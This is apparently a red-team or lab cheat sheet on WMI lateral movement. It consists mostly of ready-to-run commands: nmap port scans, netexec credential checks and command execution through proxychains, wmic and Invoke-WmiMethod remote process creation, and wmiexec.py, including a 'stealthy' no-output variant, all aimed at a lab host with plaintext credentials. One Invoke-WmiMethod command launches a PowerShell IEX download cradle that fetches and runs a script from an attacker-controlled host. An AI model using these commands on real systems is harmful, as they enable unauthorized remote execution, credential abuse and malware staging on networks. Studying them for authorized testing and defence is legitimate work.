# 05.12 WMI Lateral Movement

> Spawn processes remotely via WMI with `Invoke-WmiMethod`, `wmiexec.py`, or NetExec's `wmi` protocol (no SMB port needed).

## Overview

WMI (TCP 135 + dynamic 49152-65535) supports remote queries and process creation. From Windows, `wmic /node:` and `Invoke-WmiMethod` create processes remotely. From Linux, the `wmic` CLI client and impacket's `wmiexec.py` provide equivalent access; wmiexec.py uses port 445 for output retrieval — use `-nooutput` when port 445 is blocked. NetExec's `wmi` protocol can execute commands and retrieve output without SMB.

## Steps

- Enumerate with nmap on 135/49152-65535 and `netexec wmi` for credential validation.
- Only Administrators can perform remote WMI by default.
- Windows: `wmic /node:<IP>` queries and creates processes; `Invoke-WmiMethod -Class Win32_Process -Name Create` does the same via PowerShell.
- Credentials can be injected via `/user:/password:` (wmic) or `-Credential $cred` (PowerShell).
- Linux: `wmic -U domain/user%pass //IP "SELECT ..."` for queries.
- `wmiexec.py domain/user:pass@IP <cmd>` — add `-nooutput` to suppress SMB port 445 requirement.
- `netexec wmi` with `--wmi "<QUERY>"` for WMI queries; `-x <cmd>` for execution (output via WMI, not SMB).

## Commands

### nmap WMI ports

```bash
nmap -p135,49152-65535 <TARGET> -sV
```

### netexec wmi credential check

```bash
netexec wmi <TARGET> -u helen -p RedRiot88
```

### netexec wmi via proxychains

```bash
proxychains4 -q netexec wmi 172.20.0.52 -u helen -p RedRiot88
```

### wmic remote OS info (Windows)

```powershell
wmic /node:172.20.0.52 os get Caption,CSDVersion,OSArchitecture,Version
```

### Invoke-WmiMethod process create (Windows)

```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName 172.20.0.52
```

### Invoke-WmiMethod with payload (Windows)

```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" -ComputerName 172.20.0.52
```

### wmic Linux client query

```bash
wmic -U <DOMAIN>.local/helen%RedRiot88 //172.20.0.52 "SELECT Caption, CSDVersion, OSArchitecture, Version FROM Win32_OperatingSystem"
```

### wmiexec.py with output

```bash
wmiexec.py <DOMAIN>/helen:RedRiot88@172.20.0.52 whoami
```

### wmiexec.py no output (stealthy)

```bash
wmiexec.py <DOMAIN>/helen:RedRiot88@172.20.0.52 whoami -nooutput
```

### netexec wmi WMI query

```bash
proxychains4 -q netexec wmi 172.20.0.52 -u helen -p RedRiot88 --wmi "SELECT * FROM Win32_OperatingSystem"
```

### netexec wmi execute command

```bash
proxychains4 -q netexec wmi 172.20.0.52 -u helen -p RedRiot88 -x whoami
```
